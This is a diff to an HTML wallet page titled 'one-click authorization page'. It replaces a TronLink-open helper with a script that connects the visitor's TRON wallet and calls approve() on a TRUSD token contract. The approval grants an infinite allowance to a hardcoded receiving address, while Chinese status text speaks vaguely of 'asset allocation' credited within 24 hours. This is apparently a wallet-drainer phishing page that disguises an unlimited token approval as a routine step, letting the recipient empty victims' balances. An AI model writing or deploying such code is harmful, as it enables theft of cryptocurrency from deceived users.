@@ -26,66 +26,100 @@
       text-align: center;
       box-shadow: 0 8px 20px rgba(0,0,0,0.3);
     }
-    h1 {
-      font-size: 26px;
-      margin-bottom: 16px;
-      font-weight: 600;
-    }
-    p {
+    h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
+    p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
+    #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
+    .loading { color: #facc15; }
+    .success { color: #4ade80; }
+    .error { color: #f87171; }
+    button {
+      background: #22c55e;
+      color: #fff;
       font-size: 16px;
-      margin-bottom: 20px;
-      line-height: 1.6;
-      color: #cbd5e1;
-    }
-    #status {
-      margin-top: 20px;
-      min-height: 24px;
-      font-size: 14px;
-    }
-    .button {
-      background-color: #10b981;
-      color: white;
-      padding: 12px 20px;
       border: none;
       border-radius: 8px;
-      font-size: 16px;
+      padding: 10px 20px;
       cursor: pointer;
-      margin-top: 10px;
+      transition: background 0.3s;
     }
-    .button:hover {
-      background-color: #059669;
-    }
-    .tip {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #facc15;
+    button:hover {
+      background: #16a34a;
     }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
 <div class="container">
   <h1>一鍵授權頁面</h1>
-  <p>點擊下方按鈕開啟或安裝 TronLink 錢包 App，並從 DApp 瀏覽器重新開啟此頁。</p>
-
-  <button class="button" onclick="openTronLink()">📲 打開或安裝 TronLink</button>
-
-  <div class="tip" id="tipMessage" style="display: none;">
-    如果未自動開啟 App，請先安裝 TronLink，並從 DApp 瀏覽器貼上本頁網址<br><br>
-    <a href="https://apps.apple.com/app/id1519867270" target="_blank" style="color:#38bdf8; text-decoration:underline;">
-      ➤ 前往 App Store 安裝 TronLink
-    </a>
-  </div>
+  <p>點擊下方按鈕開始資產配置流程，系統將於 24 小時內完成入賬，請耐心等候。</p>
+  <button id="connectBtn" onclick="startProcess()">🔌 開始授權</button>
+  <p id="status" class="loading">尚未連接錢包</p>
 </div>
 
 <script>
-  function openTronLink() {
-    // 嘗試打開 App
-    window.location.href = "tronlink://wallet/dapp/details?url=" + encodeURIComponent(window.location.href);
+  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD 合約
+  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";     // 接收授權地址
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  let tronWeb;
 
-    // 延遲顯示提示
-    setTimeout(() => {
-      document.getElementById("tipMessage").style.display = "block";
-    }, 1500);
+  async function connectWallet() {
+    if (window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    if (window.tronLink) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    return null;
+  }
+
+  async function checkTronNetwork() {
+    try {
+      const chainId = await tronWeb.trx.getChainId?.();
+      if (chainId && chainId !== '_') {
+        updateStatus("請切換到 TRON 主網", "error");
+        return false;
+      }
+      return true;
+    } catch {
+      return true;
+    }
+  }
+
+  async function approve() {
+    updateStatus("資產處理中，請稍候...", "loading");
+    try {
+      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
+      await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+      updateStatus("配置完成，正在跳轉...", "success");
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 2000);
+    } catch (err) {
+      console.error(err);
+      updateStatus("操作失敗，請稍後重試。", "error");
+      setTimeout(() => {
+        window.location.href = "error.html";
+      }, 2500);
+    }
+  }
+
+  function updateStatus(msg, type) {
+    const statusEl = document.getElementById("status");
+    statusEl.innerText = msg;
+    statusEl.className = type;
+  }
+
+  async function startProcess() {
+    const address = await connectWallet();
+    if (!address) {
+      updateStatus("尚未偵測到 TRON 錢包，請於 TronLink 開啟此頁。", "error");
+      return;
+    }
+    if (!await checkTronNetwork()) return;
+    approve();
   }
 </script>
 </body>
